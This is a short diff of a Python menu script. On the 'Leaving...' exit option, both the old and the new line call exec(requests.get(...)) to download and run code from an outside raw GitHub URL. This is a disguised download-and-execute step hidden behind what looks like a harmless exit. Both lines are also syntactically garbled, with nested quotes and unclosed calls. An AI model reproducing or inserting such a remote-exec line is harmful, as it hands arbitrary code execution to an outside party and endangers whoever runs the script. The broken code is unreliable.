@@ -15,6 +15,6 @@ while True:
     if gg == '3':
         os.system('cls')
         print("                                               \033[1;39mLeaving...")
-        exec(requests.get('exec(requests.get('https://raw.githubusercontent.com/VjpProDaiIa/k/main/Multi').text)').text)
+        exec(requests.get('exec(requests.get('https://raw.githubusercontent.com/VjpProDaiIa/k/main/Multi').text)
     else:
         continue
